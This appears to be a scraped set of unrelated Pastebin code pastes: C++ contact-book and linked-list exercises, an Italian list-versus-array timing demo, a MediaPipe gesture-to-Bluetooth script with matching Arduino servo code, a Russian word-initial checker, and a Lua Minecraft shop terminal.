			if (strcmp(other.store[i].name, store[i].name) || strcmp(other.store[i].mobile_phone, store[i].mobile_phone) || strcmp(other.store[i].home_phone, store[i].home_phone) || strcmp(other.store[i].work_phone, store[i].work_phone)) {
				return false;
			}
		}
		return true;
	}

	bool operator!=(const phone_book& other) const {
		return !(*this == other);
	}

	~phone_book() {
		delete[] store;
	}

private:
	int contacts_number;
	int max_contacts_number;
	contact* store;
};


int main() {

	setlocale(LC_ALL, ""ru"");

	phone_book my_book;

	my_book.add_contact(""–ò–≤–∞–Ω"", ""+79111111111"", ""111111"", ""121212"");
	my_book.add_contact(""–û–ª—è"", ""+79111114444"", ""114444"", ""141414"");
	my_book.add_contact(""–°–∞—à–∞"", ""+79111115555"", ""115555"", ""151515"");
	my_book.add_contact(""–ñ–µ–Ω—è"", ""+79111116666"", ""116666"", ""161616"");

	my_book.show_all_contacts();

	my_book.del_contact(""–ñ–µ–Ω—è"");

	my_book.show_all_contacts();

	my_book.find_contact_name(""–°–∞—à–∞"");

	cout << endl;

	const phone_book my_book2(my_book);

	my_book2.show_all_contacts();

	phone_book my_book3;

	my_book3 = my_book;

	my_book3.show_all_contacts();

	cout << (my_book == my_book2) << endl;

	cout << (my_book != my_book2) << endl;

}
"
f2G3tSbc,Algoritmi lezione 30 - liste concatenate VS array,fcamuso,C#,Saturday 6th of July 2024 03:44:19 AM CDT,"//LINK a utility_vettori.h (le funzioni di supporto usate spesso nel sorgente principale)
// https://pastebin.com/jxsd1vSt (√® la parte all'inizio)



#include <iostream>
#include <memory>
#include <random>
#include <ctime>
#include <chrono>

using namespace std;
#include ""../../vettori/min_max/utility_vettori.h""


template <typename T>
class ListaConcatenata {
private:
    // Nodo della lista_numeri
    class Nodo {
    public:
        T dati;

        std::unique_ptr<Nodo> successivo = nullptr;

      //Nodo(T i_dati) { dati = i_dati;}
        Nodo(T i_dati) : dati(i_dati) {}
    };

    std::unique_ptr<Nodo> testa = nullptr;
    Nodo* coda = nullptr;

public:
    ListaConcatenata() {}

    // Aggiunge un elemento all'inizio della lista
    void inserisci_in_testa(T i_dati) {
        auto nuovo = std::make_unique<Nodo>(i_dati);
        if (!testa) {
            coda = nuovo.get();
        }

        //std::cout << ""testa PRIMA: "" << testa.get() << std::endl;
        nuovo->successivo = std::move(testa);
        //std::cout << ""testa DOPO: "" << testa.get() << std::endl;

        testa = std::move(nuovo);
    }

    // Aggiunge un elemento alla fine della lista
    void inserisci_in_coda(T i_dati) {
        auto nuovo = std::make_unique<Nodo>(i_dati);
        if (!coda) {
            testa = std::move(nuovo);
            coda = testa.get();
        } else {
            coda->successivo = std::move(nuovo);
            coda = coda->successivo.get();
        }
    }

    // Stampa gli elementi della lista
    void stampa() const {
        Nodo* temp = testa.get();
        while (temp) {
            std::cout << temp->dati << "" -> "";
            temp = temp->successivo.get();
        }
        std::cout << ""nullptr"" << std::endl;
    }

    // Stampa gli elementi della lista
    int conta() const {
        int cont = 0;

        Nodo* temp = testa.get();
        while (temp) {
            cont++;
            temp = temp->successivo.get();
        }
        return cont;
    }


    // Rimuove il primo elemento con il i_dati specificati
    void elimina(T i_dati) {
        Nodo* temp = testa.get();
        Nodo* precedente = nullptr;

        // Se il nodo da rimuovere √® la testa
        if (temp && temp->dati == i_dati) {
            testa = std::move(testa->successivo);
            if (!testa) {
                coda = nullptr;
            }
            return;
        }

        // Cerca il nodo da rimuovere
        while (temp && temp->dati != i_dati) {
            precedente = temp;
            temp = temp->successivo.get();
        }

        // Se il nodo non √® stato trovato
        if (!temp) return;

        // Rimuove il nodo
        precedente->successivo = std::move(temp->successivo);
        if (!precedente->successivo) {
            coda = precedente;
        }
    }

    // Controlla se la lista √® vuota
    bool vuota() const {
        return !testa;
    }

    bool inserisci_alla_posizione(int posizione, T i_dati)
    {
      int conta_nodi = 0;
      Nodo *temp = testa.get();

      if (posizione<0) return false;

      if (posizione == 0)
      {
        inserisci_in_testa(i_dati);
        return true;
      }
      else
      {
        while (temp && conta_nodi < posizione-1)
        {
          conta_nodi++;
          temp = temp->successivo.get();
        }

        if (temp)
        {
          auto nuovo = std::make_unique<Nodo>(i_dati);
          nuovo->successivo = std::move(temp->successivo);
          temp->successivo = std::move(nuovo);
          return true;
        }
        else
          return false;
      }

    }

};

//   struct Dati {
//      double * v;
//
//      Dati() { v = new double[50000];}
//   };

//   struct Dati {
//      double v[100];
//   };


    const long NUM_ELEMENTI = 1000;
    unsigned long v[NUM_ELEMENTI*2];

    //Dati vDati[NUM_ELEMENTI * 2];




int main() {
    ListaConcatenata<unsigned long> lista_numeri;

//    lista_numeri.inserisci_in_coda(1);
//    lista_numeri.inserisci_in_coda(2);
//    lista_numeri.inserisci_in_coda(3);
//    lista_numeri.inserisci_in_coda(4);
////
//    std::cout << ""lista_numeri: "";
//
//    lista_numeri.elimina(1);
//    lista_numeri.elimina(4);
//    lista_numeri.elimina(4);
//    lista_numeri.elimina(2);
//    lista_numeri.elimina(3);
//
//
//
//
//    lista_numeri.inserisci_alla_posizione(-9, 999);
//    lista_numeri.stampa(); return 0;
//



    //carico met√† vettore
    carica_vettore_interi(v, NUM_ELEMENTI);
    long inseriti = NUM_ELEMENTI;


    //creo una lista con gli stessi elementi
    for (int i=0; i<NUM_ELEMENTI; i++)
       lista_numeri.inserisci_in_coda(v[i]);

      //stampa_vettore_interi(v, inseriti);
      //cout << endl;
      //lista_numeri.stampa();
      //cout << endl << endl;

    int punto_inserimento = 0;
//    Dati da_inserire;
//    da_inserire.v[0] = 999;

    srand(5);

    Cronometro(Stato::START);
    for (int i=0; i<NUM_ELEMENTI; i++)
    {
      punto_inserimento = rand()%inseriti;
      //shift per inserire in punto_inserimento
      for (int j = inseriti; j>punto_inserimento; j--)
        v[j] = v[j-1];

      v[punto_inserimento] = 999; //da_inserire;  //999;
      inseriti ++;
    }
    //stampa_vettore_interi(v, inseriti);
    cout << endl;


    cout << ""Tempo impiegato con vettore: "" << Cronometro(Stato::STOP) << endl;

    //stesse operazioni con lista
    srand(5);
    inseriti = NUM_ELEMENTI;

    Cronometro(Stato::START);
    for (int i=0; i<NUM_ELEMENTI; i++)
    {
      punto_inserimento = rand()%inseriti;
      lista_numeri.inserisci_alla_posizione(punto_inserimento, 999);
      inseriti++;
    }

    cout << ""Tempo impiegato con lista: "" << Cronometro(Stato::STOP) << endl;

    //lista_numeri.stampa();

    return 0;
}
"
htuHm9Hv,Untitled,35657,C++,Saturday 6th of July 2024 03:27:57 AM CDT,"#include <iostream>

using namespace std;


class ForwardList {
public:

    struct Node { //–æ–¥–Ω–æ—Å–≤—è–∑–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ —É–∑–ª–æ–≤
        int value; // —É–∑–µ–ª —Ö—Ä–∞–Ω–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω—É—é —á–∞—Å—Ç—å
        Node* next; // –∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π —É–∑–µ–ª –≤ —Å–ø–∏—Å–∫–µ
    };

    void push_front(const int& value) {
        head_ = new Node{ value, head_ };
        size_++;
    }

    void pop_front() {
        if (head_ != nullptr) {
            Node* temp = head_;
            head_ = head_->next;
            delete temp;
            size_--;
        }
    }

    void insert(const int index, const int value) {
        if (index == 0) {
            push_front(value);
            return;
        }
        if (index > 0 && index <= size_) {
            Node* temp = head_;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size_++;
        }
    }

    void erase(const int index) {
        if (index == 0) {
            pop_front();
            return;
        }
        Node* temp = head_;
        for (int i = 0; i < index - 1; i++) {
            temp = temp->next;
        }
        
        Node* buf = temp->next->next;
        delete temp->next;
        temp->next = buf;
        size_--;
    }

    int& operator[] (const int index) {
        if (index >= 0 && index < size_) {
            Node* temp = head_;
            for (int i = 0; i < index; i++) {
                temp = temp->next;
            }
            return temp->value;
        }
    }

    const int& operator[] (const int index) const {
        if (index >= 0 && index < size_) {
            Node* temp = head_;
            for (int i = 0; i < index; i++) {
                temp = temp->next;
            }
            return temp->value;
        }
    }

    bool operator==(const ForwardList& other) const {
        if (size_ != other.size_) {
            return false;
        }
        Node* temp = head_;
        Node* other_temp = other.head_;

        while (temp != nullptr) {
            if (temp->value != other_temp->value) {
                return false;
            }
            temp = temp->next;
            other_temp = other_temp->next;
        }
        return true;
    }

    bool operator!=(const ForwardList& other) const {
        return !(*this == other);
    }

    void print() {
        Node* temp = head_;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int& front() {
        if (head_ != nullptr) {
            return head_->value;
        }
    }

    const int& front() const {
        if (head_ != nullptr) {
            return head_->value;
        }
    }

    int find(const int value) {
        Node* temp = head_;
        
        for (int i = 0; i < size_; i++) {
            if (temp->value == value) {
                return i;
            }
            temp = temp->next;
        }
        return -1;
    }

    void clear() {
        while (head_ != nullptr) {
            pop_front();
        }
    }

    int size() const {
        return size_;
    }

private:
    int size_ = 0;
    Node* head_ = nullptr;
};

int main() {

    ForwardList list1;

    for (int i = 0; i < 10; i++) {
        list1.push_front(i + 1);
    }
    list1.print();
    cout << list1.size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.pop_front();
    }
    list1.print();
    cout << list1.size() << endl;

    cout << list1.front() << endl;

    list1.insert(3, 15);

    list1.erase(2);

    list1.front() = 22;

    list1.print();

    cout << list1.find(4) << endl;

    //list1.clear();

    //list1.print();

    cout << list1[3] << endl;

    ForwardList list2;

    cout << (list1 == list2) << endl;

    cout << (list1 != list2) << endl;
}"
XqNJPCwt,Python - HC05 Communication + Mediapipe,NaroxEG,Python,Saturday 6th of July 2024 02:31:07 AM CDT,"import cv2
import mediapipe as mp
import serial

# Initialize MediaPipe Hands.
mp_hands = mp.solutions.hands
mp_drawing = mp.solutions.drawing_utils
hands = mp_hands.Hands(min_detection_confidence=0.5, min_tracking_confidence=0.5)

bluetooth_port = 'COM5'
baud_rate = 9600

ser = serial.Serial(bluetooth_port, baud_rate)

def recognize_gesture(landmarks):
    # Extract the required landmarks for the fingers
    thumb_tip = landmarks[mp_hands.HandLandmark.THUMB_TIP]
    index_tip = landmarks[mp_hands.HandLandmark.INDEX_FINGER_TIP]
    middle_tip = landmarks[mp_hands.HandLandmark.MIDDLE_FINGER_TIP]
    ring_tip = landmarks[mp_hands.HandLandmark.RING_FINGER_TIP]
    pinky_tip = landmarks[mp_hands.HandLandmark.PINKY_TIP]

    thumb_ip = landmarks[mp_hands.HandLandmark.THUMB_IP]
    index_dip = landmarks[mp_hands.HandLandmark.INDEX_FINGER_DIP]
    middle_pip = landmarks[mp_hands.HandLandmark.MIDDLE_FINGER_PIP]
    ring_pip = landmarks[mp_hands.HandLandmark.RING_FINGER_PIP]
    pinky_pip = landmarks[mp_hands.HandLandmark.PINKY_PIP]

    wrist = landmarks[mp_hands.HandLandmark.WRIST]

    # Calculate if fingers are raised
    is_thumb_up = thumb_tip.y < thumb_ip.y and abs(thumb_tip.x - wrist.x) > abs(thumb_tip.y - wrist.y)
    is_index_up = index_tip.y < index_dip.y
    is_middle_up = middle_tip.y < middle_pip.y
    is_ring_up = ring_tip.y < ring_pip.y
    is_pinky_up = pinky_tip.y < pinky_pip.y

    # Recognize the gestures
    if not is_index_up and not is_middle_up and not is_ring_up and not is_pinky_up and not is_thumb_up:
            return ""Fist""
    elif is_index_up and is_middle_up and is_ring_up and is_pinky_up and not is_thumb_up:
        return ""Four Fingers""
    elif is_index_up and is_middle_up and is_ring_up and is_pinky_up and is_thumb_up:
        return ""Open Hand""
    elif is_index_up and not is_middle_up and not is_ring_up and not is_pinky_up:
        return ""One Finger""
    elif is_index_up and is_middle_up and not is_ring_up and not is_pinky_up:
        return ""Two Fingers""
    elif is_index_up and is_middle_up and is_ring_up and not is_pinky_up:
        return ""Three Fingers""
    else:
        return ""Unknown Gesture""

# For webcam input:
cap = cv2.VideoCapture(0)

while cap.isOpened():
    success, image = cap.read()
    if not success:
        break

    # Flip the image horizontally for a later selfie-view display
    # Convert the BGR image to RGB.
    image = cv2.cvtColor(cv2.flip(image, 1), cv2.COLOR_BGR2RGB)
    image.flags.writeable = False
    results = hands.process(image)

    # Draw the hand annotations on the image.
    image.flags.writeable = True
    image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)
    if results.multi_hand_landmarks:
        for hand_landmarks in results.multi_hand_landmarks:
            mp_drawing.draw_landmarks(image, hand_landmarks, mp_hands.HAND_CONNECTIONS)
            landmarks = hand_landmarks.landmark
            gesture = recognize_gesture(landmarks)
            if gesture == ""One Finger"":
                ser.write(b'1')
            elif gesture == ""Two Fingers"":
                ser.write(b'2')
            elif gesture == ""Three Fingers"":
                ser.write(b'3')
            elif gesture == ""Four Fingers"":
                ser.write(b'4')
            elif gesture == ""Open Hand"":
                ser.write(b'5')
            elif gesture == ""Fist"":
                ser.write(b'0')
            cv2.putText(image, gesture, (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0, 0), 2, cv2.LINE_AA)
    
    # Display the image.
    cv2.imshow('MediaPipe Hands', image)
    if cv2.waitKey(5) & 0xFF == 27:
        break

hands.close()
cap.release()
cv2.destroyAllWindows()
"
zQXDaFzJ,INO - Arm Robot,NaroxEG,C++,Saturday 6th of July 2024 02:30:28 AM CDT,"#include <SoftwareSerial.h>
#include <Servo.h>

Servo thumb;
Servo index;
Servo middle;
Servo ring;
Servo pinky;

SoftwareSerial bluetooth(3, 2); // RX, TX

void setup() {
  Serial.begin(9600);
  bluetooth.begin(9600);
  thumb.attach(4);
  index.attach(5);
  middle.attach(6);
  ring.attach(7);
  pinky.attach(8);
}

void loop() {
  if (bluetooth.available() > 0) {
    char received = bluetooth.read();
    if (received == '0') {
      thumb.write(0);
      pinky.write(0);
      ring.write(0);
      middle.write(0);
      index.write(0);
    } else if (received == '1') {
      index.write(90);
      pinky.write(0);
      ring.write(0);
      middle.write(0);
      thumb.write(0);
    } else if (received == '2') {
      index.write(90);
      middle.write(90);
      pinky.write(0);
      ring.write(0);
      thumb.write(0);
    } else if (received == '3') {
      index.write(90);
      middle.write(90);
      ring.write(90);
      pinky.write(0);
      thumb.write(0);
    } else if (received == '4') {
      index.write(90);
      middle.write(90);
      ring.write(90);
      pinky.write(90);
      thumb.write(0);
    } else if (received == '5') {
      index.write(90);
      middle.write(90);
      ring.write(90);
      pinky.write(90);
      thumb.write(90);
    }
  }
}
"
5dGy3kUH,dovlatov,plarmi,Python,Saturday 6th of July 2024 02:25:56 AM CDT,"import re


def dovlatov(sentence):
    flag = True
    array = []
    match = re.split("" "", sentence)
    for i in match:
        if i[0][0] in array:
            print(""–í—ã —Ä–∞—Å—Å—Ç—Ä–æ–∏–ª–∏ –°–µ—Ä–≥–µ—è –î–æ–Ω–∞—Ç–æ–≤–∏—á–∞"")
            flag = False
            break
        else:
            array.append(i[0][0])

    if flag:
        print(""–ú–µ—Ç–æ–¥ –î–æ–≤–ª–∞—Ç–æ–≤–∞ —Å–æ–±–ª—é–¥—ë–Ω"")


sentence1 = ""–ó–¥–µ—Å—å –≤—Å–µ —Å–ª–æ–≤–∞ –Ω–∞—á–∏–Ω–∞—é—Ç—Å—è —Å —Ä–∞–∑–Ω—ã—Ö –±—É–∫–≤.""
sentence2 = ""–ê –≤ —ç—Ç–æ–º –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–∏ –µ—Å—Ç—å —Å–ª–æ–≤–∞, –∫–æ—Ç–æ—Ä—ã–µ –≤—Å—ë-—Ç–∞–∫–∏ –Ω–∞—á–∏–Ω–∞—é—Ç—Å—è –Ω–∞ –æ–¥–Ω—É –∏ —Ç—É –∂–µ –±—É–∫–≤—É.""
sentence3 = ""–ê –∑–¥–µ—Å—å —Å–æ–≤—Å–µ–º –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ: —Å–∏–º–≤–æ–ª ¬´–∞¬ª –æ–¥–Ω–æ–±—É–∫–≤–µ–Ω–Ω—ã–π.""

print(""–ü–µ—Ä–≤–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ: "")
dovlatov(sentence1)
print(""–í—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ: "")
dovlatov(sentence2)
print(""–¢—Ä–µ—Ç—å–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ: "")
dovlatov(sentence3)"
3zeQTDP2,Alles NEU Main PC,MagmaLP,Lua,Saturday 6th of July 2024 02:18:17 AM CDT,"term.setBackgroundColor(32768)
term.setCursorPos(1,1)
term.clear()
 
------------------------------------------------------------
term.setTextColor(colors.yellow)
print(""Item Trading System"")
print(""~~~~~~~~~~~~~~~~~~~"")
print("" "")
term.setTextColor(colors.red)
print("" "")
print(""please come closer !!!"")
print(""please come closer !!!"")
print(""please come closer !!!"")
print("" "")
print(""Always stand inside the white circle"")
print(""on the floor, that goes around the Computer."")
print("" "")
print("" "")
print("" "")
print("" "")
term.setTextColor(colors.lightGray)
print(""Shop build by MagmaLP"")
print(""System programmed by MagmaLP"")
print(""01.01.2023"")
print(""In case of errors please report to MagmaLP"")
------------------------------------------------------------
 
local itemList = { ""HV Solar Panel"", ""MV Solar Panel"", ""LV Solar Panel"", ""ME Cable"", ""ME Storage Bus"", ""ME Import Bus"",
                 ""ME Export Bus"",
                 ""ME Controller"", ""ME Access Terminal"", ""ME Drive"", ""Re-Enriched Uranium Cell"", ""ME 64k Storage"", ""ME 16k Storage"", 
                 ""ME 4k Storage"" } 
 
function calc_color(color)
    return math.pow(2, color - 1)
end
 
function msg(gap, line, color, groundb, text) 
    term.setBackgroundColor(calc_color(groundb))
    term.setCursorPos(gap,line)
    term.setTextColor(calc_color(color))
    text = term.write(text)
end 
 
file = fs.open(""local/"", ""w"")           --name local l√∂schen
file.write(""                                "")
file.close()
 
m0 = 0
m1 = 0
m2 = 0
m3 = 0
m4 = 0
m5 = 0
m6 = 0
m7 = 0
m8 = 0
m9 = 0
m10 = 0
m11 = 0
m12 = 0
m13 = 0
m14 = 0
m15 = 0
m16 = 0
m17 = 0
M = {m0, m1, m2, m3, m4, m5, m6, m7, m8, m9, m10, m11, m12, m13, m14, m15, m16, m17}
 
b1 = 0 
b2 = 0
b3 = 8000
b4 = 1000
b5 = 150
b6 = 10
b7 = 125
b8 = 125
b9 = 120
b10 = 250
b11 = 150
b12 = 65
b13 = 3
b14 = 5000
b15 = 2000
b16 = 1000
b17 = 0
B = {b1, b2, b3, b4, b5, b6, b7, b8, b9, b10, b11, b12, b13, b14, b15, b16, b17}

function ScanForItems()
    os.loadAPI(""ocs/apis/sensor"")
    sen = sensor.wrap(""left"")
    s = sen.getTargets()
    function getS()
        for v, k in pairs(s) do
            if k.Name == ""ME Wireless Access Point"" then
                return v
            end
        end
    end

    -- Berechnungen der Summe der Items
    function calculateSum(items)
        local summe = 0
        local itemValues = {
            [""Shard of Minium""] = 25,
            [""Tungsten Ore""] = 40,
            [""Silver Ore""] = 3,
            [""Shiny Ingot""] = 500,
            [""Ferrous Ore""] = 50,
            [""Quartz Crystal""] = 25,
            [""Nether Star""] = 6000,
            [""Wither Skeleton Skull""] = 2000,
            [""Ghast Tear""] = 120,
            [""Lead Ore""] = 4
        }

        for _, item in pairs(items) do
            if itemValues[item.Name] then
                local number = item.Size * itemValues[item.Name]
                summe = summe + number
            end
        end
        return summe
    end

    -- Holen der Item-Details und Berechnung der Summe
    local target = getS()
    if target then
        local s1 = sen.getTargetDetails(target)
        summe = tonumber(calculateSum(s1.Items))
    end
    
    file = fs.open(""local/"" , ""r"")              	--read user
    name = file.readLine()
    file.close()
    
    file = fs.open(""user/"" ..name, ""r"")         	--geld auslesen
    money = tonumber(file.readLine())
    file.close()
    
    money = money + summe							--zusammenrechnen		
    
    local file = fs.open(""user/"" ..name.. ""/"", ""w"")	--eintragen
    file.write(money)
    file.close()
    
    print("""")
    print(""Summe: "" .. summe)
    print(""Gesammt: "" .. money)
    
    rs.setOutput(""back"", true)
    sleep(0.5)
    rs.setOutput(""back"", false)
    
end

function kaufen()
    local event, button, X, Y = os.pullEvent(""mouse_click"")
    for i = 3,16 do                                             --item von zeile 3-16
        if X >= 39 and X <= 41 and Y == i then                  -- +1
            if M[i] < 99 then                                   -- max 99
                M[i] = M[i] + 1
                c = c + B[i]
                msg(44,i,04,16,""""..M[i].."""")
                msg(44,19,06,16,""""..c..""$"")
                break
            end
        end
        if X >= 47 and X <= 49 and Y == i then                  -- -1
            if M[i] > 0 then
                M[i] = M[i] - 1
                c = c - B[i]
                msg(44,i,04,16,""""..M[i].."" "")
                msg(44,19,06,16,""""..c..""$     "")
                break
            end
        end
    end

    c = tonumber(c)
    money = tonumber(money)        

    if X >= 08 and X <= 15 and Y == 19 then                 --Abbrechen
        os.reboot()   

    elseif X >= 01 and X <= 05 and Y == 19 then             --Kaufen    
        if c > money then                                   --zu wenig Geld
            msg(43,19,01,15,"" ""..c..""$ "")
            sleep(0.25) 
            msg(43,19,06,16,"" ""..c..""$ "")
            sleep(0.25)
            msg(43,19,01,15,"" ""..c..""$ "")
            sleep(0.25)
            msg(43,19,06,16,"" ""..c..""$ "")
            sleep(0.5)

        elseif c <= money then                              --genug Geld
            money = money - c

            file = fs.open(""local/"" , ""r"")              --read user
            name = file.readLine()
            file.close()
            file = fs.open(""user/"" ..name.. ""/"", ""w"")
            file.write(money)
            file.close()

            if fs.exists(""spendmoney/"" ..name) == false then          --create spendmoney directory
                file = fs.open(""spendmoney/"" ..name.. ""/"", ""w"")
                file.write(0.0)
                file.close()
            end

            file = fs.open(""spendmoney/"" ..name, ""r"")             --read user of spendmoney directory
            oldspendmoney = file.readLine()
            file.close()

            spendmoney = oldspendmoney + c

            file = fs.open(""spendmoney/"" ..name.. ""/"", ""w"")
            file.write(spendmoney)
            file.close()
        end
    end 
    kaufen()   
end
 
function writeToFile(item, amount)
    local file = http.get(""http://www.atomuhr.de/uhrzeit/"")
    local file2 = file.readAll()
    local length = file2.len(file2)
    local start = length - 40
    local endString = length - 22
    local time = string.sub(file2, start, endString)
                
    file = fs.open(""kaufliste"", ""a"")
    file.write(""\n"", "" "")
    file.write(time.."" "")
    file.write(name.."" "")
    file.write(itemList[item].."" ""..amount)
    file.close()
end

function Main()
    while true do
        os.loadAPI(""ocs/apis/sensor"")
		s = sensor.wrap(""top"")
        for name,info in pairs(s.getTargets()) do               --detect user
            if fs.exists(""user/"" ..name) == false then          --create user
                file = fs.open(""user/"" ..name.. ""/"", ""w"")
                file.write(0.0)
                money = ""0.0""
                file.close()
            else
                file = fs.open(""user/"" ..name, ""r"")             --read user
                money = file.readLine()
                file.close()
            end

            file = fs.open(""local/"", ""w"")           --name local speichern
            file.write(name)
            file.close()

            for a = 1,20 do
                for b = 1,51 do
                    msg(b,a,16,16,"" "")
                end
            end

            msg(01,01,06,16,""< Account of ""..name.."" >"")   msg(36,01,06,16,"" >  ""..money..""$        "")      --√ºberschrift
            msg(01,02,04,16,""+-------------------------------------------------+"")

            msg(06,07,01,15,""                  "")   msg(30,07,01,15,""                "")         --mainscreen
            msg(06,08,01,15,""  deposit money   "")   msg(30,08,01,15,""   buy items    "") 
            msg(06,09,01,15,""                  "")   msg(30,09,01,15,""                "")

            msg(02,13,09,16,""This PC exchanges items for virtual money"")
            msg(02,14,09,16,""(saved on this PC)"")
            msg(02,15,09,16,""in order to buy other items with it."")

            msg(01,19,01,16,""                   >> Top-List <<                       "")

            local event, button, X, Y = os.pullEvent(""mouse_click"") 
            if X >= 06 and X <= 23 and Y >= 07 and Y <= 09 then                                 --Verkauf Screen
                for a = 3,20 do
                    for b = 1,50 do
                        msg(b,a,16,16,"" "")
                    end
                end
                msg(02,06,01,15,""                                                 "")
                msg(02,07,01,15,"" click here to see a list of all sellable items  "")
                msg(02,08,01,15,""                                                 "")

                msg(02,12,09,16,""Throw in all items on the left and confirm with"")
                msg(02,13,09,16,""the button below. The money is stored permanently "")
                msg(02,14,09,16,""until you buy something with it."")

                msg(40,16,01,15,""          "")
                msg(40,17,01,15,"" confirm  "")   msg(32,17,01,16,""----->"")
                msg(40,18,01,15,""          "")

                msg(01,19,16,01,""back"")

                local event, button, X, Y = os.pullEvent(""mouse_click"") 
                if X >= 03 and X <= 48 and Y >= 06 and Y <= 08 then         --item list button
                    for a = 3,20 do
                        for b = 1,50 do
                            msg(b,a,16,16,"" "")
                        end
                    end 

                    msg(02,04,09,16,""1x Shard of Minium =   25$         (64x = 1600$)"")
                    msg(02,05,09,16,""1x Quartz Crystal  =   25$         (64x = 1600$)"")
                    msg(02,06,09,16,""1x Lead Ore        =    4$         (64x = 256$)"")
                    msg(02,07,09,16,""1x Silver Ore      =    3$         (64x = 192$)"")
                    msg(02,08,09,16,""1x Tungsten Ore    =   40$         (64x = 2560$)"")
                    msg(02,09,09,16,""1x Ferrouse Ore    =   50$         (64x = 3200$)"")
                    msg(02,10,09,16,""1x Ghast Tear      =  120$         (64x = 7680$)"")
                    msg(02,11,09,16,""1x Shiny Ingot     =  500$         (64x = 32000$)"")
                    msg(02,12,09,16,""1x Wither Skull    = 2000$"")
                    msg(02,13,09,16,""1x Nether Star     = 6000$"")

                    msg(01,19,16,01,""back"")                
                    local event, button, X, Y = os.pullEvent(""mouse_click"") 
                    if X >= 01 and X <= 04 and Y == 19 then                 --back button
                        os.reboot()
                    end
                elseif X >= 40 and X <= 49 and Y >= 16 and Y <= 18 then     --confirm button
                    ScanForItems()
----------------------------
                elseif X >= 01 and X <= 04 and Y == 19 then                 --back button2
                        os.reboot()
                end

            elseif X >= 30 and X <= 45 and Y >= 07 and Y <= 09 then         --kaufen Screen

                for a = 3,20 do
                    for b = 1,50 do
                        msg(b,a,16,16,"" "")
                    end
                end
                c = 0.0
                msg(01,03,04,16,""| 8000$ HV Solar Panel"")               msg(51,03,04,16,""|"")
                msg(01,04,04,16,""| 1000$ MV Solar Panel"")               msg(51,04,04,16,""|"")
                msg(01,05,04,16,""|  150$ LV Solar Panel"")               msg(51,05,04,16,""|"")
                msg(01,06,04,16,""|   10$ ME Cable         "")            msg(51,06,04,16,""|"")
                msg(01,07,04,16,""|  125$ ME Storage Bus   "")            msg(51,07,04,16,""|"")
                msg(01,08,04,16,""|  125$ ME Import Bus    "")            msg(51,08,04,16,""|"")
                msg(01,09,04,16,""|  120$ ME Export Bus    "")            msg(51,09,04,16,""|"")
                msg(01,10,04,16,""|  250$ ME Controller    "")            msg(51,10,04,16,""|"")
                msg(01,11,04,16,""|  150$ ME Access Terminal"")           msg(51,11,04,16,""|"")
                msg(01,12,04,16,""|   65$ ME Drive"")                     msg(51,12,04,16,""|"")
                msg(01,13,04,16,""|    3$ Re-Enriched Uranium Cell"")     msg(51,13,04,16,""|"")
                msg(01,14,04,16,""| 5000$ ME 64k Storage   "")            msg(51,14,04,16,""|"")
                msg(01,15,04,16,""| 2000$ ME 16k Storage   "")            msg(51,15,04,16,""|"")
                msg(01,16,04,16,""| 1000$ ME  4k Storage   "")            msg(51,16,04,16,""|"")
                msg(01,17,04,16,""|                        "")            msg(51,17,04,16,""|"")
                msg(01,18,04,16,""+-------------------------------------------------+"")
                msg(01,19,01,15,"" Buy "") msg(08,19,01,15,"" Cancel "")  
				msg(18,19,01,15,"" <- "") msg(23,19,01,15,"" Page "") msg(30,19,01,15,"" -> "")
                msg(36,19,04,16,""Amount:"")  msg(44,19,06,16,""""..c..""$"")  

                for i = 3,16 do                     -- +f√ºr zeile 3-16
                    msg(40,i,01,15,"" + "")   
                end
                for i = 3,16 do                     -- 0f√ºr zeile 3-16
                    msg(44,i,04,16,""0"")
                end
                for i = 3,16 do                     -- -f√ºr zeile 3-16
                    msg(47,i,01,15,"" - "")
                end   
                kaufen()
            elseif X >= 19 and X <= 34 and Y >= 18 and Y <= 19 then         --Top-List Screen
                for a = 1,20 do
                    for b = 1,50 do
                        msg(b,a,16,16,"" "")
                    end
                end 

                msg(01,01,06,16,""                 Money - Top List                  "")      --√ºberschrift 1
                msg(01,02,04,16,""+-------------------------------------------------+"")

                -- Funktion zum Einlesen des Inhalts einer Datei und Umwandeln in eine Zahl
                local function readNumberFromFile(fileName)
                    local file = fs.open(fileName, ""r"")
                    if file then
                        local content = file.readAll()
                        file.close()
                        return tonumber(content)
                    end
                    return nil
                end

                -- Verzeichnisname
                local directory = ""user""

                -- Liste aller Dateien im Verzeichnis
                local files = fs.list(directory)

                -- Tabelle zur Speicherung der Spieler und ihrer Punkte
                local scores = {}

                -- Durchlaufen aller Dateien im Verzeichnis
                for _, file in ipairs(files) do
                    local filePath = fs.combine(directory, file)
                    local score = readNumberFromFile(filePath)
                    if score then
                        table.insert(scores, {name = file, score = score})
                    end
                end

                -- Funktion zum Sortieren der Scores
                local function compareScores(a, b)
                    return a.score > b.score
                end

                -- Sortieren der Scores
                table.sort(scores, compareScores)

                -- Ausgabe der Top 5 Spieler
                for i = 1, math.min(6, #scores) do
                    print(i .. "". "" .. scores[i].name .. "" - "" .. scores[i].score)
                end

                msg(01,10,06,16,""              Money spend - Top List               "")      --√ºberschrift 2
                msg(01,11,04,16,""+-------------------------------------------------+"")

                -- Funktion zum Einlesen des Inhalts einer Datei und Umwandeln in eine Zahl
                local function readNumberFromFile(fileName)
                    local file = fs.open(fileName, ""r"")
                    if file then
                        local content = file.readAll()
                        file.close()
                        return tonumber(content)
                    end
                    return nil
                end

                -- Verzeichnisname
                local directory = ""spendmoney""

                -- Liste aller Dateien im Verzeichnis
                local files = fs.list(directory)

                -- Tabelle zur Speicherung der Spieler und ihrer Punkte
                local scores = {}

